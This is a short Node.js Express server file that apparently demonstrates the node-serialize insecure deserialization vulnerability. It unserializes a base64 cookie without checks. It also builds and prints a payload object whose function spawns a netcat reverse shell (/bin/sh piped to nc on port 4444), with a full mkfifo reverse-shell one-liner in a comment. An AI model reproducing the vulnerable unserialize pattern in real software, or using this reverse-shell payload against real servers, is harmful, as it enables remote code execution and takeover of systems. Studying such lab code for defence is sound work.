var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
// require('child_process').execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f", function puts(error, stdout, stderr) {});
x = {
    username : function(){
      require('child_process').execSync("/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f", function puts(error, stdout, stderr) {});
    }
};
console.log(serialize.serialize(x));
app.get('/', function(req, res) {
  if (req.cookies.profile) {
    var str = new Buffer(req.cookies.profile, 'base64').toString();
    console.log(str)
    var obj = serialize.unserialize(str);
    if (obj.username) {
      res.send("Hello " + escape(obj.username) + "<br>" + "Your Country is "+escape(obj.country) + "<br>" + "Your city is " + escape(obj.city));
    }
  } 
  else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6IllhY2hhIFZlbmthdGEgUmFrZXNoIiwiY291bnRyeSI6IkluZGlhIiwiY2l0eSI6IlRpcnVwYXRpIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
     res.send("Hello World");
  }
});
app.listen(3000);